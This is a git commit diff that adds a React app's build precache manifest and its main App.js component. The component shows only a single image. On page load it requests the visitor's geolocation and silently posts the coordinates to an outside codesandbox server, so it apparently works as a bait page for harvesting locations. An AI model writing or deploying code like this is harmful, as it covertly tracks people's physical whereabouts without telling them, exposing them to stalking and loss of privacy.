4dbcbeefffd872fa8ce983c2757920f6ee375661
Cai Martin <cmartin.professional@yahoo.com>
2020-04-06 15:21:13 -0400

    init

---
+++ build/precache-manifest.d77bb6904c7ced3b77a5590fcc1a3e24.js
@@ -0,0 +1,22 @@
+self.__precacheManifest = (self.__precacheManifest || []).concat([
+  {
+    "revision": "01235436a98e774eb53b7776c8cc43e8",
+    "url": "/index.html"
+  },
+  {
+    "revision": "c7fbe3c781e5e3840fca",
+    "url": "/static/css/main.9b1431d8.chunk.css"
+  },
+  {
+    "revision": "632e2de353615acc0a95",
+    "url": "/static/js/2.252ee8e9.chunk.js"
+  },
+  {
+    "revision": "c7fbe3c781e5e3840fca",
+    "url": "/static/js/main.d989162e.chunk.js"
+  },
+  {
+    "revision": "42ac5946195a7306e2a5",
+    "url": "/static/js/runtime~main.a8a9905a.js"
+  }
+]);
---
+++ src/App.js
@@ -0,0 +1,29 @@
+import React from "react";
+import "./styles.css";
+import { geolocated } from "react-geolocated";
+import axios from "axios";
+export default class App extends React.Component {
+  componentDidMount = () => {
+    console.log("mounted");
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(displayLocationInfo);
+    }
+
+    function displayLocationInfo(position) {
+      const lng = position.coords.longitude;
+      const lat = position.coords.latitude;
+
+      axios.post("https://922h0.sse.codesandbox.io/location", {
+        location: " new location " + lng + lat
+      });
+    }
+  };
+  render() {
+    return (
+      <div className="App">
+        <img src="https://qph.fs.quoracdn.net/main-qimg-8c2b3992e3d041bb85d6effa28af3806" />{" "}
+      </div>
+    );
+  }
+}
+geolocated();
